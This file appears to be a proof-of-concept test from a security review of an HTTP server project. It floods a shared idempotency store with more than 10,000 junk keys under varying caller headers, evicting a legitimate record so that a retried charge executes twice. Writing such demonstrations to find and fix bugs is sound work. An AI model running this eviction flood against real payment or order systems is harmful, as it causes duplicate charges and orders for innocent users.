// PoC 6: Idempotency guarantee is remotely revocable -> duplicate side effects.
//
// src/server.js:
//   if (this.idemStore.size >= 10000) this.idemStore.delete(this.idemStore.keys().next().value);
//
// `idemStore` is ONE global map shared by every caller, and its key embeds the
// *attacker-chosen* subject (see PoC 1). A caller who varies one header can evict
// every legitimate idempotency record, so a retried mutation executes twice
// (double charge / duplicate order) instead of replaying the memoised result.

import { H4Server } from '../src/server.js';
import { Limiter } from '../src/limits.js';

let charges = 0;
const server = new H4Server({
  routes: {
    'POST /charge': async () => {
      charges++; // <- the side effect that must happen exactly once per Idempotency-Key
      return { status: 200, body: { charged: true }, cost: 1 };
    },
  },
  limiter: new Limiter({ budget: 1_000_000, windowMs: 10_000 }),
});

const now = Date.now();
const req = (instance, idem) => ({
  headers: [
    [':method', 'POST'],
    [':path', '/charge'],
    [':scheme', 'https'],
    ['h4-agent-instance', instance],
  ],
  intent: { mode: 1, idem, deadlineMs: 30_000, costCeiling: 0, maxShape: 0, dedup: '' },
  cost: { predicted: 1, costClass: 0, effortBits: 0, budgetRemaining: 0, value: 0, tokenBudget: 0 },
  peer: '203.0.113.9',
  body: null,
});

await server.handle(req('alice', 'order-42'), now);
await server.handle(req('alice', 'order-42'), now); // honest retry of the same logical order
console.log(`alice sends order-42 twice -> charges = ${charges}  (idempotency works)`);

// Unrelated caller floods the SHARED store with junk keys (different subject each time).
for (let i = 0; i < 10_050; i++) await server.handle(req(`attacker-${i}`, `junk-${i}`), now);
console.log(`idemStore size after flood : ${server.idemStore.size}`);

const before = charges;
await server.handle(req('alice', 'order-42'), now); // alice legitimately retries order-42 again
console.log(`alice retries order-42     -> charges = ${charges}  (was ${before})`);
console.log(charges > before
  ? '  *** IDEMPOTENCY DESTROYED: the same Idempotency-Key executed the mutation AGAIN (double charge) ***'
  : '  idempotency held');
